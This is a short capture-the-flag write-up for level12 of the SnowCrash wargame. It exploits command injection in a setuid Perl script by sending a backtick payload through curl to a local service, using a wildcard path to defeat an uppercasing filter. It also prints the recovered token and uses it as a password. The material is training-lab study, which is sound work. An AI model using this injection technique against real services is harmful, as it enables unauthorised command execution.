# level12

Using `ls`, we discover a perl script.

```bash
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

We find another RCE by looking into the script. However, we cannot get the ouput of the script and a regex is uppercasing our payloads.

Let's write our payload in a file.

```bash
level12@SnowCrash:~$ echo "getflag > /tmp/flag" > /tmp/PAYLOAD
level12@SnowCrash:~$ chmod 777 /tmp/PAYLOAD

```

Now, lets exploit the RCE, we can use a willcarded directory as our payload will be uppercased.

```bash
level12@SnowCrash:~$ curl localhost:4646?x='`/*/PAYLOAD`'
..level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

Let's head to level13.

```bash
level12@SnowCrash:~$ su level13
Password: g1qKMiRpXf53AWhDaU7FEkczr
level13@SnowCrash:~$ 
```
